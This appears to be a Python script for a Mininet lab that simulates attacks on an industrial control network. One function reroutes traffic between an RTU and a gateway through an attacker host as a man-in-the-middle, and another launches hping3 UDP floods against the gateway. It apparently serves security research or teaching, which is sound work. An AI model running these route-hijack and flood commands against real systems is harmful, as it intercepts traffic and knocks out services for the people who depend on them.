import os
from datetime import datetime

DEFAULT_RTU_NAME = "h2"
DEFAULT_GATEWAY_NAME = "h3"
DEFAULT_ATTACKER_NAME = "h5"

def run_mitm_attack(net, rtu_name=DEFAULT_RTU_NAME, gateway_name=DEFAULT_GATEWAY_NAME, attacker_name=DEFAULT_ATTACKER_NAME):
    print("Running MITM with dual-homed attacker...")
    """
    Full MITM routing:
    - RTU -> Gateway through attacker
    - Gateway -> RTU through attacker
    """
    attacker = net.get(attacker_name)
    rtu = net.get(rtu_name)
    gateway = net.get(gateway_name)

    # Assumption: attacker second interface in control subnet is configured as 10.0.2.100/24
    attacker_ctrl_ip = "10.0.2.100"
    rtu_ip = rtu.IP()
    gateway_ip = gateway.IP()

    attacker.cmd("sysctl -w net.ipv4.ip_forward=1")
    rtu.cmd(f"ip route replace {gateway_ip} via {attacker_ctrl_ip}")
    gateway.cmd(f"ip route replace {rtu_ip} via {attacker_ctrl_ip}")

    print(f"MITM active: {rtu_name} <-> {gateway_name} via {attacker_name} ({attacker_ctrl_ip})")


def run_dos_attack(net, mode="light"):
    h5 = net.get('h5')
    target_ip = "10.0.2.2"  # gateway
    target_port = 5001

    os.makedirs("logs/host", exist_ok=True)

    # Hentikan serangan sebelumnya
    h5.cmd("pkill -f hping3")

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if mode == "light":
        print("Running LIGHT DoS (Controlled UDP flood)")
        h5.cmd(f"echo '\\n===== DoS LIGHT {timestamp} =====' >> logs/host/h5.log")
        h5.cmd(
            f"hping3 --udp -p {target_port} -i u50 {target_ip} "
            f">> logs/host/h5.log 2>&1 &"
        )

    elif mode == "heavy":
        print("Running HEAVY DoS (Full UDP flood)")
        h5.cmd(f"echo '\\n===== DoS HEAVY {timestamp} =====' >> logs/host/h5.log")
        h5.cmd(
            f"hping3 --udp --flood -p {target_port} {target_ip} "
            f">> logs/host/h5.log 2>&1 &"
        )
